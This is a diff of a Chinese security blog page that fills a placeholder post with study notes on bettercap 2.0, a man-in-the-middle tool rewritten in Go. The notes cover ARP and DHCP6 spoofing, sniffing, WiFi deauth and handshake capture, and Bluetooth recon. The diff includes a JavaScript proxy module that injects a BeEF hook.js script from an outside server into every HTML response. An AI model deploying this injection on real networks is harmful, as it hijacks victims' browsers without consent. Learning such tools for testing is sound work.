@@ -6,20 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://wanalogy.github.io">
-  <title>bettercap使用go重写后的重新学习 | AI Sec</title>
+  <title>bettercap使用go重写后的学习笔记（Simone博客篇） | AI Sec</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="测试">
+  <meta name="description" content="[TOC] Simone在今年2月份的博文上宣布将betercap更新到了2.0版本，将bettercap用go语言重写了一遍，不过模块改用了javascript实现，并进行了功能升级和扩展。(PS:之前为了写bettercap的模块，学习了ruby的基础，这回又改学习go和javascript的了 (-__-)b。) 下面是我的一些学习笔记，错误之处，还望大家不吝赐教。 bettercap2.0">
 <meta name="keywords" content="bettercap">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bettercap使用go重写后的重新学习">
-<meta property="og:url" content="https://wanalogy.github.io/2018/04/11/testing/index.html">
+<meta property="og:title" content="bettercap使用go重写后的学习笔记（Simone博客篇）">
+<meta property="og:url" content="https://wanalogy.github.io/2018/04/11/bettercap使用go重写后的重新学习/index.html">
 <meta property="og:site_name" content="AI Sec">
-<meta property="og:description" content="测试">
+<meta property="og:description" content="[TOC] Simone在今年2月份的博文上宣布将betercap更新到了2.0版本，将bettercap用go语言重写了一遍，不过模块改用了javascript实现，并进行了功能升级和扩展。(PS:之前为了写bettercap的模块，学习了ruby的基础，这回又改学习go和javascript的了 (-__-)b。) 下面是我的一些学习笔记，错误之处，还望大家不吝赐教。 bettercap2.0">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-04-11T08:11:17.360Z">
+<meta property="og:updated_time" content="2018-04-15T15:13:23.571Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bettercap使用go重写后的重新学习">
-<meta name="twitter:description" content="测试">
+<meta name="twitter:title" content="bettercap使用go重写后的学习笔记（Simone博客篇）">
+<meta name="twitter:description" content="[TOC] Simone在今年2月份的博文上宣布将betercap更新到了2.0版本，将bettercap用go语言重写了一遍，不过模块改用了javascript实现，并进行了功能升级和扩展。(PS:之前为了写bettercap的模块，学习了ruby的基础，这回又改学习go和javascript的了 (-__-)b。) 下面是我的一些学习笔记，错误之处，还望大家不吝赐教。 bettercap2.0">
   
     <link rel="alternative" href="/atom.xml" title="AI Sec" type="application/atom+xml">
   
@@ -147,27 +147,72 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-testing" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-bettercap使用go重写后的重新学习" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      bettercap使用go重写后的重新学习
+      bettercap使用go重写后的学习笔记（Simone博客篇）
     </h1>
   
 
         
-        <a href="/2018/04/11/testing/" class="archive-article-date">
+        <a href="/2018/04/11/bettercap使用go重写后的重新学习/" class="archive-article-date">
   	<time datetime="2018-04-11T07:17:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-11</time>
 </a>
+        
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>测试</p>
+        <p>[TOC]</p>
+<p>Simone在今年2月份的<a href="https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/" target="_blank" rel="noopener">博文</a>上宣布将betercap更新到了2.0版本，将bettercap用go语言重写了一遍，不过模块改用了javascript实现，并进行了功能升级和扩展。(PS:之前为了写bettercap的模块，学习了ruby的基础，这回又改学习go和javascript的了 (-__-)b。)</p>
+<p>下面是我的一些学习笔记，错误之处，还望大家不吝赐教。</p>
+<h1 id="bettercap2-0的主要改进"><a href="#bettercap2-0的主要改进" class="headerlink" title="bettercap2.0的主要改进"></a>bettercap2.0的主要改进</h1><h2 id="1-从ruby迁移到go"><a href="#1-从ruby迁移到go" class="headerlink" title="1. 从ruby迁移到go"></a>1. 从ruby迁移到go</h2><p>由于go优越的并发性能，可以解决ruby导致的<a href="https://en.wikipedia.org/wiki/Global_interpreter_lock" target="_blank" rel="noopener">GIL</a>问题（ps：没有仔细研究GIL，应该指的是启动应用程序后，就没有办法再进行配置，每次更改都必须重新启动）。</p>
+<p>同时，go语言实现也可以使得bettercap可以运行在低配置的硬件设备上，并且仍然可以实现每秒代理数以百计的连接，并转发数以千计的数据包，之前的ruby版本只能处理每秒5-6个连接，原因是解释器在locking的时候，会对I/O做出限制。简而言之，在实现MITM攻击的时候，不再产生不想要的网络DoS攻击。（ps:之前一直受困于这个问题，现在才知道是这个问题）</p>
+<p>内存和cpu的使用率也得到了大幅度优化，你可以在树莓派等各种设备上同时启动多个bettercap实例，但cpu的占有率不会超过20%，除非你要攻击一个巨大的子网。你也可以实时监控局域网的活动，同时扫描wifi接入点，攻击附近的蓝牙设备。</p>
+<h2 id="2-安装方便，可移植性好"><a href="#2-安装方便，可移植性好" class="headerlink" title="2.安装方便，可移植性好"></a>2.安装方便，可移植性好</h2><p>安装不需要任何依赖（在一些平台上需要使用lipcap.so，实际测试，kali rolling版本上需要链接过去），升级的时候，只需要运行下面的命令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/bettercap/bettercap</span><br></pre></td></tr></table></figure>
+<p>同时，提供全平台支持。</p>
+<h2 id="3-模块重写"><a href="#3-模块重写" class="headerlink" title="3. 模块重写"></a>3. 模块重写</h2><ul>
+<li><a href="https://github.com/bettercap/bettercap/wiki" target="_blank" rel="noopener">session 模块</a>:</li>
+</ul>
+<p>实现了之前版本的一些有用的功能：</p>
+<ol>
+<li>net.recon: 搜索网络中的新主机</li>
+<li>net.probe: 持续侦测新的主机</li>
+<li>arp.spoof: arp毒化</li>
+<li>dhcp6.spoof: dhcp6毒化</li>
+<li>net.sniff :数据包嗅探</li>
+<li>sys.scan :syn扫描</li>
+<li>event.stream 显示事件流，也就是在控制台输出日志信息</li>
+</ol>
+<ul>
+<li>代理模块：</li>
+</ul>
+<p>采用javascript实现，主要实现onLoad方法和onResponse方法，onLoad方法是在模块加载前执行，而onResponse则是在请求执行前和响应返回后执行。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onLoad</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    log( <span class="string">"BeefInject loaded."</span> );</span><br><span class="line">    log(<span class="string">"targets: "</span> + env[<span class="string">'arp.spoof.targets'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onResponse</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( res.ContentType.indexOf(<span class="string">'text/html'</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">var</span> body = res.ReadBody();</span><br><span class="line">        <span class="keyword">if</span>( body.indexOf(<span class="string">'&lt;/head&gt;'</span>) != <span class="number">-1</span> ) &#123;</span><br><span class="line">            res.Body = body.replace( </span><br><span class="line">                <span class="string">'&lt;/head&gt;'</span>, </span><br><span class="line">                <span class="string">'&lt;script type="text/javascript" src="http://beef-server:3000/hook.js"&gt;&lt;/script&gt;&lt;/head&gt;'</span> </span><br><span class="line">            ); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>caplets(胶囊)</p>
+<p>这个东东类似metasploit中的rc文件，用来保存shell脚本，不过是bettercap自定义的shell命令。具体的讲解，我放到以后的文档学习中再详细说明。</p>
+<p>模块：</p>
+<ul>
+<li>http-req-dump.cap</li>
+<li>netmon.cap</li>
+<li>airodump.cap</li>
+<li>mitm6.cap</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-wifi-蓝牙-等"><a href="#3-wifi-蓝牙-等" class="headerlink" title="3. wifi 蓝牙 等"></a>3. wifi 蓝牙 等</h2><p>新增的wifi模块实现了wifi信号侦测，deauth攻击（就是迫使对方下线），net.sniffer(在wifi模块下是用来抓wpa2握手包的)。</p>
+<p>新增的蓝牙模块包括ble.recon侦测，ble.eum设备枚举，ble.write(ps:还没研究是做什么用的)，wifi.fuzz和wifi.fuzz还在开发中，sdr类设备也在开发中。</p>
+<p>作者说可以和kismet,airodump,airmon说byebye了，有时间实测一下哈。</p>
+<h2 id="4-跨平台"><a href="#4-跨平台" class="headerlink" title="4. 跨平台"></a>4. 跨平台</h2><p>包括linux,windows,mac,树莓派等版本。</p>
+<h2 id="5-Habemus-API"><a href="#5-Habemus-API" class="headerlink" title="5. Habemus API"></a>5. Habemus API</h2><p>不知道该怎么解释Habemus ，有懂的同学不吝赐教啊。</p>
+<p>作者认为这是这个版本最大的改变，或者说是具有了最大潜在的功能：<a href="https://github.com/bettercap/bettercap/wiki/api.rest" target="_blank" rel="noopener"><strong>REST API</strong></a>。如果你有一个运行在dropbox上的bettercap实例，或者通过运行android可执行程序开发了一个手机应用程序，你就可以使用http.server模块自己来为web界面提供服务，然后只需要创建一个WebView来渲染它。（ps：没怎么看懂，直接翻译的，希望看懂了的小伙伴能够指点一二啊）</p>
 
       
 
@@ -258,7 +303,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://wanalogy.github.io/2018/04/11/testing/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://wanalogy.github.io/2018/04/11/bettercap使用go重写后的重新学习/" alt="微信分享二维码">
     </div>
 </div>
 
